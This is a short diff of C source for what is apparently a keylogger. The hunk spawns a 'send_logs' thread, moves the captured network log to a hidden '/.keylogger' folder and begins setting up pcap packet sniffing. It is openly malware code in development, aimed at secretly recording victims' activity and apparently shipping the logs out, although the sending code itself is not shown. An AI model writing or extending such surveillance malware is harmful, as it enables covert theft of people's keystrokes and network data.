@@ -81,19 +81,17 @@ int main(int argc, char **argv)
     pthread_t sendlogs;
     pthread_create(&sendlogs, &attr, send_logs, NULL);
 
-    /***TODO - update paths***/
     /*Open log folders*/
-    FILE *network_log = fopen("log/network.txt", "a");
+    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
     if (network_log == NULL)
     {
         printf("Error opening network log. Exiting...");
         exit(1);
     }
     setbuf(network_log, NULL);
+
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
 
-
-    
     /* Variables for pcap sniffing, such as error buffer, device to be read
        and filters, masks, etc. */
     char *dev, errbuf[100];
